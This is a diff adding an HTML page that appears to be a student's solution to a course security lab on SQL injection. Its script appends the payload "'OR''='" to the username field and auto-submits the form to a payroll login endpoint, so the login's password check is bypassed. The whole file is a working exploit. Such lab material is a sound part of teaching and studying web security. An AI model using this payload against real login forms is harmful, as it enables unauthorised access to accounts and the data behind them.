@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>SQL Injection</title>
+  </head>
+  <body onload="">
+    <form id="myform" action="http://payroll.gatech.edu/index.php" onsubmit="hack" method="POST">
+    <!--
+      Your exploits here
+      You may also want to change some form attributes
+    -->
+      Username:
+      <input id="targetlogin" type="text" name="login" value="" />
+      <input type="hidden" name="action" value="login" />
+      <input type="hidden" name="pw" value="" />
+      <button id="exploit" type="submit" value="submit">Hold onto your butts!</button>
+    </form>
+  </body>
+  <script>
+var button = document.getElementById('exploit');
+button.onclick = hack;
+function hack(e) {
+    e.preventDefault();
+    //var login = document.getElementById('targetlogin').value + "' OR ''='";
+    document.getElementById('targetlogin').value = document.getElementById('targetlogin').value + "'OR''='";
+    var form = document.getElementById('myform');
+    form.submit();
+}
+  </script>
+</html>
